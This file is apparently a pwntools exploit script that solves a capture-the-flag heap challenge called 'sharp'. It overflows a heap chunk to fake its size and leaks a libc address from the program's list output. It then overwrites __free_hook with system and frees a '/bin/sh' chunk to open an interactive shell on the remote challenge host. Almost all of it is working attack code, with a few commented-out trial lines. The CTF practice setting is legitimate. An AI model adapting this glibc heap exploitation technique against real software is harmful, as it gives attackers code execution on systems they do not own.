#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.ctf.games --port 31782 ./sharp
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sharp_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.ctf.games'
port = int(args.PORT or 31782)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = exe.libc

def add(name):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(name))

def remove(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(idx))

def edit(idx,name):
    io.sendlineafter("> ","3")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(name))

def swap(idx_from,idx_to):
    io.sendlineafter("> ","4")
    io.sendlineafter(": ",str(idx_from))
    io.sendlineafter(": ",str(idx_to))

def list():
    io.sendlineafter("> ","5")


add("A"*16)#0
add("B"*16)#1
add("C"*16)#2

add("D"*16)#3
add("J"*16)#4
p = (p64(0)+p64(0x11))*7
add("J"*16)
add("J"*16)
add("J"*16)
add("J"*16)
add("J"*16)
add(p)
add("J"*16)
# add("C"*16)

# remove(1)
# p = "a"*112 
# p += p64(0) + p64(0x31)
# p += p64(0)
# edit(2,p)
edit(0,"a"*112 +'\x00'*8 +p64(0x441))

remove(1)

add("E"*16)
# add("E"*16)

# edit(4,'F'*4*16)
list()

io.recvuntil("user: ")
io.recvuntil("user: ")
data = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(data)
libc.address = data - libc.sym['__malloc_hook'] -0x70
print hex(libc.address)

free = libc.sym['__free_hook']

add("M"*16)

remove(5)
remove(1)


edit(10,p64(free))
add("/bin/sh\x00")
add(p64(libc.sym['system']))

remove(10)

io.interactive()

